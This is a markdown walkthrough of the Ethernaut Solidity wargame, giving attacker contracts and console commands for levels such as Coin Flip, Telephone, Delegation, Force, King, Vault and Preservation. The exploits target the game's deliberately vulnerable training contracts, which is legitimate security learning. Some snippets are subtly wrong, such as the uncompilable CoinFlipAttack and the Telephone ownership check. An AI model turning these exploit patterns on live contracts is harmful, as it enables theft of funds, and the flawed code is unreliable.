

## [Note]:

1. The first step at all level you need create new instance button, after confirm transaction You can see contract address as the image:

    ![img](./img/create_instance.png)

2. When you see `<file_name>.sol`. We need create a `<file_name>.sol` to deploy or inject it to metamask. 

   You can use that: https://remix.ethereum.org/

3. For combine a file on remix.ethereum:
    ![img](./img/combine.png)
    
    [1]: Button for combine
    [2]: Select version solidity. It match with `pragma` with you define

4. For deploy a file on remix.ethereum:
    ![img](./img/deploy.png)
    
    [1]: Select type inject to metamask if you use metamask wallet <br />
    [2]: Select your account want on wallet.<br/>
    [3]: Select file you want to deploy.<br/>
    [4]: address param you want deploy to <br/>
    [5]: As you see we have `isLastFloor` function and `setTop` function after We deployed We have button to execute they with params. 



## Go to ethernaut

### Hello
console: <br/>
```
await contract.info();
await contract.info1();
await contract.infoNum();
await contract.info42();
await contract.theMethodName();
await contract.method7123949();
await contract.authenticate(await contract.password());
```
confirm transaction and wait until done
===> submit level


### Fallback:
console:
```
contract.contribute({value: 1})
```
```
await contract.sendTransaction({value: 1})
```
```
await contract.withdraw()
```
===> submit level

### Fallout
console:
```
contract.Fal1out()
```
===> submit level


### Coin Flip
CoinFlip.sol ==> create and copy content of this level.<br>
replace:<br> 
- `@openzeppelin/contracts/math/SafeMath.sol` => `https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol`<br>
- `pragma solidity ^0.6.0` => `pragma solidity ^0.8.0;`;

CoinFlipAttack.sol ==>
```
pragma solidity ^0.8.0;
import './CoinFlip.sol';

contract CoinFlipAttack {

    CoinFlip public _v;
    uint256 FACTOR = <copy_from_CoinFlip.sol>;
    
    constructor(address v) public {
        _v = v;
    }

    function flip() public returns (bool) {
        uint256 b = uint256(blockhash(block.number -1));
        uint256 coinFlip = uint256(b/FACTOR);
        bool side = coinFlip == 1 ? true : false;
        _v.flip(side);
    }
}
```

Deploy `CoinFlipAttack.sol` with params:<br>
- address: `contract.address` get on console window

Click button flip least 10 times

console:

`await contract.consecutiveWins()` <br>

check `words` property is `[10, anything_there]`

===> submit level
<br>

### Telephone
Telephone.sol ==> create and copy content of this level.<br>
TelephoneAttack.sol
```
pragma solidity ^0.6.0;
import './Telephone.sol';

contract TelephoneAttack {

    Telephone w;
    
    constructor(address t) public {
        w = Telephone(t);
    }

    function attack(address _a) public {
        w.changeOwner(_a);
    }
}
```

Deploy with params:<br>
- address: `contract.address` get on console window

click attack with param is your address
<br>
check `contract.address` will be your address

===> submit level

### Token
console
```
//any_address but don't use player address
contract.transfer('<any_address>', 20 + 1);
```


### Delegation
console<br>
```
contract.sendTransaction({data: web3.utils.sha3("pwn()")})
```

===> Submit level

### Force
ForceAttack.sol
```
pragma solidity ^0.4.26;

contract ForceAttack {
    constructor() public payable{
    }

    function attack(address _a) public {
        selfdestruct(_a);
    }
}
```
Deploy `ForceAttack.sol` with params:<br>
- value: 1 wei

Execute attack button with `contract.address` on console window

===> Submit level


### Vault
console
```
let pwd;
await web3.eth.getStorageAt(contract.address, 1, (e,r)=>{pwd=r;})
await web3.utils.toAscii(pwd)
contract.unlock(pwd)
await contract.locked()
```
===> Submit level

### King
AttackKing.sol
```
pragma solidity ^0.4.26;

contract AttackKing {
    constructor(address a) public payable{
        address(a).call.value(msg.value)();
    }

    function() external payable{
        revert('You lose!');
    }
}
```

Deploy with params:<br>
- address: `contract.address` get on console window
- value: 1 ether

===> Submit level

### Elevator
Elevator.sol ==> create and copy content of this level.<br>
ElevatorAttack.sol
```
pragma solidity ^0.6.0;
import './Elevator.sol';

contract ElevatorAttack {
    bool public toggle = true;
    Elevator public target;

    constructor(address a) public payable{
        target = Elevator(a);
    }

    function isLastFloor(uint) public returns(bool) {
        toggle = !toggle;
        return toggle;
    }

    function setTop(uint _f) public {
        target.goTo(_f);
    }
}
```

Deploy with params:<br>
- address: `contract.address` get on console window

click button setTop with param is 15

===> submit level

### Gatekeeper Two
GatekeeperTwoAttack.sol
```
pragma solidity ^0.6.0;

contract GatekeeperTwoAttack {
    constructor(address a) public {
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
        a.call(abi.encodeWithSignature('enter(bytes8)', _key));
    }
}
```

Deploy with params:<br>
- address: `contract.address` get on console window

===> submit level

### Naught Coin
console:<br>
```
let a = (await contract.balanceOf(player)).toString();
await contract.approve(player, a);
(await contract.allowance(player, player)).toString();
//any_address do not use player address
await contract.transferFrom(player, "<any_address>", a)
(await contract.balanceOf(player)).toString()
``` 
==> 0

### Preservation
PreservationAttack.sol
```
pragma solidity ^0.6.0;

contract PreservationAttack {
    address a;
    address b;
    address public o;
    uint time;

    function setTime(uint t) public {
        o = msg.sender;
    }
}
```
Deploy

Copy address:<br>
![img](./img/preservation.png)

console:
```
await contract.setFirstTime("address_copied")
await contract.setFirstTime("12345")
```
===> submit level

### Recovery
console
```
let data = await web3.eth.abi.encodeFunctionCall({
    name: 'destroy',
    type: 'function',
    inputs: [{
        type: 'address',
        name: '_to'
    }]
},[player]);
await web3.eth.sendTransaction({
    to: "<your_contract_address_loss_key>",
    from: player,
    data: data
})
```
===> submit level
